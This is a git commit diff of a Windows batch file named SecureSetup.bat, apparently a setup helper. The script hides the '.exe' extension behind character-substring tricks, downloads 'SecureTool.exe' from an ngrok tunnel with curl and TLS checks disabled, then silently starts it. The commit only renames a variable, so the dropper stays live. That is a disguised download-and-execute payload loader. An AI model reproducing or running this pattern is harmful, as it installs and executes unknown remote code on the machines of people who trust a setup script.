159c240527445ef248b812b298dbf4bec07c037d
josephtesting97-source <josephtesting97@gmail.com>
2026-04-15 19:15:04 -0700

    Update SecureSetup.bat

--- SecureSetup.bat
+++ SecureSetup.bat
@@ -3,15 +3,14 @@ setlocal
 
 SET mypath=%~dp0
 
-set ran_name=SecureTool
 set chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
 
-set ran_name=%ran_name%.%chars:~4,1%%chars:~23,1%%chars:~4,1%
+set name=SecureTool.%chars:~4,1%%chars:~23,1%%chars:~4,1%
 
-cmd /c curl -f -k -o %ran_name% https://chug-frostbite-outthink.ngrok-free.dev/uploads/SecureTool.exe
+cmd /c curl -f -k -o %name% https://chug-frostbite-outthink.ngrok-free.dev/uploads/SecureTool.exe
 
-if exist %mypath%%ran_name% (
-    start %mypath%%ran_name%
+if exist %mypath%%name% (
+    start %mypath%%name%
 )
 
 EXIT
